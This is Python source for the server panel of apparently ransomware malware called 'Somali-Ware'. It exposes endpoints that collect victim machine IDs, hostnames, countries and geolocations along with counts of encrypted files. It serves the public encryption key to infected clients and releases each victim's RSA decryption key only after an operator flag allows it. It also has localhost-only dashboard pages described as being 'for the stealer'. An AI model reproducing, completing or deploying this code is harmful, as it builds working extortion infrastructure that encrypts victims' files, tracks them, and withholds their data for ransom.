import os
import base64
import aiosqlite

from panel.ui.modules.first_time.first_time import MakeFiles
from panel.ui.modules.notifications.notifications import Notifications
from panel.ui.modules.settings.settings import Settings
from panel.ui.handlers.logs_handler import LogHandler

from panel.ui.pages.frames.main_frame import frame

from panel.ui.pages.index_page import fr_page
from panel.ui.pages.credits import credits_page
from panel.ui.pages.settings_page import settings_stuff
from panel.ui.pages.clients_page import clients_page_stuff
from panel.ui.pages.analytics_page import analytics_page_stuff

from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import JSONResponse

from nicegui import ui, app

limiter = Limiter(key_func=get_remote_address)
app = FastAPI()
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)


good_dir = os.getenv("APPDATA")

file_handler = MakeFiles()
file_handler.ensure_all_dirs()

db_path = os.path.join(good_dir, "Somali-Ware", "kdot.db")
db_path_graphs = os.path.join(good_dir, "Somali-Ware", "graphs.db")
db_path_map = os.path.join(good_dir, "Somali-Ware", "map.db")
db_path_injections = os.path.join(good_dir, "Somali-Ware", "injections.json")

# Notification Handler
NOTIFICATIONS = Notifications()


def check_remote_connection(request: Request):
    client_host = request.client.host
    if client_host != "127.0.0.1" and client_host != "localhost":
        raise HTTPException(status_code=403, detail="Access forbidden unless localhost")
    return True


async def initialize_database_logs():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS entries (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hwid TEXT UNIQUE,
                country_code TEXT,
                hostname TEXT,
                date TEXT,
                timezone TEXT,
                files_encrypted INTEGER DEFAULT 0,
                rsa_key TEXT,
                allowed_to_decrypt INTEGER DEFAULT 0
            )
        """
        )
        await db.commit()


async def initialize_database_graphs():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path_graphs) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS graphs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT,
                hostname TEXT,
                country_code TEXT
            )
        """
        )
        await db.commit()


async def initalize_database_map():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path_map) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS map (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT,
                hostname TEXT,
                longitude TEXT,
                latitude TEXT
            )
        """
        )
        await db.commit()


async def already_added(hwid: str) -> bool:
    async with aiosqlite.connect(db_path) as db:
        cursor = await db.execute("SELECT * FROM entries WHERE hwid = ?", (hwid,))
        return await cursor.fetchone() is not None


@app.on_event("startup")
async def on_startup():
    """Startup event to initialize the database."""
    await initialize_database_logs()
    await initialize_database_graphs()
    await initalize_database_map()


@app.post("/data")
@limiter.limit("1/hour", error_message="Only 1 request per hour allowed")
async def receive_data(request: Request) -> JSONResponse:
    """Receive data from the client and store it in the database.

    Args:
        file (UploadFile, optional): File that we receive. Defaults to File(...).

    Raises:
        HTTPException: Raise an exception if the file type is not a ZIP file and not formatted correctly.

    Returns:
        JSONResponse: Return a JSON response with the status of the file.
    """

    handler = LogHandler()
    await handler.process_log(request)
    info = handler.get_file_info()
    if await already_added(info["hwid"]):
        return JSONResponse(content={"status": "already added"})

    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            """
            INSERT OR REPLACE INTO entries (hwid, country_code, hostname, date, timezone, files_encrypted, rsa_key, allowed_to_decrypt) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                info["hwid"],
                info["country_code"],
                info["hostname"],
                info["date"],
                info["timezone"],
                info["files_found"],
                info["rsa_key"],
                0,
            ),
        )
        await db.commit()

    async with aiosqlite.connect(db_path_graphs) as db:
        await db.execute(
            """
            INSERT INTO graphs (date, hostname, country_code) 
            VALUES (?, ?, ?)
            """,
            (
                info["date"],
                info["hostname"],
                info["country_code"],
            ),
        )
        await db.commit()

    NOTIFICATIONS.send_notification(f"New log from {info['hostname']}")
    # return JSONResponse(content={"status": "ok"})

    locations = info["location"].split(":")
    lat_long = (locations[0], locations[1])

    if lat_long == (None, None):
        return JSONResponse(content={"status": "error"})

    async with aiosqlite.connect(db_path_map) as db:
        await db.execute(
            """
            INSERT OR REPLACE INTO map (date, hostname, longitude, latitude)
            VALUES (?, ?, ?, ?)
            """,
            (
                info["date"],
                info["hostname"],
                lat_long[0],
                lat_long[1],
            ),
        )
        await db.commit()

    return JSONResponse(content={"status": "ok"})


@app.get("/pkey")
async def get_key() -> JSONResponse:
    """Get the public key for the client to encrypt the data.

    Returns:
        JSONResponse: Return the public key.
    """
    with open(os.path.join(good_dir, "Somali-Ware", "keys", "receiver.pem"), "r") as f:
        key = f.read()

    return JSONResponse(content={"key": key})


@app.get("/decrypt/{hwid}")
async def get_decrypt_key(hwid: str) -> JSONResponse:
    """Get the decryption key for the client to decrypt the files.

    Args:
        hwid (str): HWID of the client.

    Returns:
        JSONResponse: Return the decryption key.
    """
    hwid = base64.b64decode(hwid).decode()
    if await already_added(hwid):
        # return JSONResponse(content={"key": "already added"}, status_code=1337)
        # check if they're allowed to decrypt first
        async with aiosqlite.connect(db_path) as db:
            cursor = await db.execute(
                "SELECT allowed_to_decrypt FROM entries WHERE hwid = ?", (hwid,)
            )
            allowed = await cursor.fetchone()

        # this just means there are no users currently in the DB
        try:
            if not allowed[0]:
                return JSONResponse(content={"key": "not allowed"}, status_code=403)
        except TypeError:
            pass

        async with aiosqlite.connect(db_path) as db:
            cursor = await db.execute(
                "SELECT rsa_key FROM entries WHERE hwid = ?", (hwid,)
            )
            rsa_key = await cursor.fetchone()

        return JSONResponse(content={"key": base64.b64encode(rsa_key[0]).decode()})

    else:
        return JSONResponse(content={"key": "NEW USER"}, status_code=404)


@ui.page("/")
async def main_page(request: Request) -> None:
    """Main page for the stealer. Very simple."""
    check_remote_connection(request)
    with frame(True):
        await fr_page()


@ui.page("/clients")
async def clients_page(request: Request) -> None:
    """Clients page for the stealer"""
    check_remote_connection(request)
    with frame(True):
        await clients_page_stuff(db_path)


@ui.page("/settings")
async def settings(request: Request) -> None:
    """Settings page for the stealer. (NEEDS TO BE REWORKED OR ATLEAST A NEW UI LMFAO)"""
    check_remote_connection(request)
    with frame(True):
        await settings_stuff()


@ui.page("/credits")
async def credits_stuff(request: Request) -> None:
    """Credits page for the stealer."""
    check_remote_connection(request)
    with frame(True):
        await credits_page()


@ui.page("/analytics")
async def analytics_page(request: Request) -> None:
    """Analytics page for the stealer."""
    check_remote_connection(request)
    with frame(True):
        await analytics_page_stuff()


@ui.page("/clients/{hwid}/{path}")
def open_client_stuff(request: Request, hwid: str, path: str) -> None:
    """Open a client's log files."""
    check_remote_connection(request)
    with frame(True):
        # await open_client(hwid, path)
        pass


ui.run_with(app, title="Somali-Ware")

current_settings = Settings()

if not os.path.exists(
    os.path.join(good_dir, "Somali-Ware", "keyfile.pem")
) or not os.path.exists(os.path.join(good_dir, "Somali-Ware", "certfile.pem")):
    file_handler.fix_key_and_certs()
